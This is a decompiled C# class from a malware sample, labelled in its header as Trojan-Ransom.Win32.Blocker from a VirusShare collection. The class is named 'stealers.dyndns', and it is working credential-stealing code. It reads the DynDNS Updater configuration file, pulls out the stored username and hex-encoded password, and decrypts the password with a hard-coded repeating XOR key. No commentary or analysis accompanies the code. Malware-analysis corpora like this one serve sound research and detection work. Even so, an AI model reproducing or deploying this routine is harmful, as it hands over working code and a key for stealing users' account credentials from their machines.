// Decompiled with JetBrains decompiler
// Type: rundll32.stealers.dyndns
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using System;
using System.Globalization;
using System.IO;

namespace rundll32.stealers
{
  internal class dyndns
  {
    public static dyndns.acount steal()
    {
      string str1 = File.ReadAllText(Environment.GetEnvironmentVariable("ALLUSERSPROFILE") + "\\DynDNS\\Updater\\config.dyndns");
      string str2 = "";
      string str3 = "";
      string str4 = str1;
      char[] chArray = new char[1]{ '\n' };
      foreach (string str5 in str4.Split(chArray))
      {
        if (str5.Contains("Username="))
          str2 = str5.Replace("Username=", "").Replace("\r", "");
        if (str5.Contains("Password="))
          str3 = str5.Replace("Password=", "").Replace("\r", "");
      }
      string str6 = "";
      for (int startIndex = 0; startIndex < str3.Length; startIndex += 2)
        str6 += ((char) long.Parse(str3.Substring(startIndex, 2), NumberStyles.HexNumber)).ToString();
      long startIndex1 = 0;
      string str7 = "";
      for (int startIndex2 = 0; startIndex2 < str6.Length; ++startIndex2)
      {
        str7 += (string) (object) (char) ((uint) str6.Substring(startIndex2, 1)[0] ^ (uint) "t6KzXhCh".Substring((int) startIndex1, 1)[0]);
        if (startIndex1 == 7L)
          startIndex1 = -1L;
        ++startIndex1;
      }
      return new dyndns.acount()
      {
        user = str2,
        pass = str7
      };
    }

    public struct acount
    {
      public string user;
      public string pass;
    }
  }
}
